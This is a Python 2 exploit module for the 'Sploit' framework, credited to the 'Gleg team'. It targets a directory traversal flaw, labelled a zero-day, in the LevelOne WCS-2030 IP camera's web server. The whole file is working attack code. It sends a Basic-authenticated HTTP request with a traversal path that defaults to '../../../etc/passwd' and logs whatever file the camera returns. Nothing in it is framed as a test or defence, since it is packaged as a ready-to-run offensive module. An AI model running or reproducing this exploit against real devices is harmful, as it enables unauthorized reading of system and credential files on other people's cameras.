#!/usr/bin/env python

import urllib2
import urllib
import base64
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_levelone_wcs_2030_directory_traversal"
INFO['DESCRIPTION'] = "LevelOne WCS-2030 IP Camera Directory Traversal"
INFO['VENDOR'] = "http://global.level1.com/ru/downloads.php?modelstr1=WCS&modelstr2=2030&pdtversion=3"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Camera's http server is vulnerable to directory traversal. Authorization required.
Tested against WCS-2030 firmware IP7137-LVLO-0205a.
    """
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG']="22 Mar, 2018. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.0.1"
OPTIONS["PORT"] = 80
OPTIONS["USERNAME"] = ""
OPTIONS["PASSWORD"] = ""
OPTIONS["FILE"] = '../../../etc/passwd'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.username = self.args.get("USERNAME")
        self.password = self.args.get("PASSWORD")
        self.file = self.args.get("FILE", OPTIONS["FILE"])

    def make_request(self, path=''):
        url = 'http://%s:%s/%s' % (self.host, self.port, path)
        request = urllib2.Request(url)
        if self.username:
            request.add_header("Authorization", "Basic %s" % self.encode_creds(self.username, self.password))
        try:
            res = urllib2.urlopen(request).read()
        except urllib2.HTTPError as e:
            if e.code == 401:
                self.log('[-] Wrong credentials: %s:%s' % (self.username, self.password))
                self.finish(False)
            else:
                raise e
        return res

    def encode_creds(self, login, password):
        base64string = base64.encodestring('%s:%s' % (login, password)).replace('\n', '')
        return base64string

    def run(self):
        #Get options from gui
        self.args()
        self.log('[*] Trying to get contents of %s' % self.file)
        res = self.make_request(self.file)
        self.log(res)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
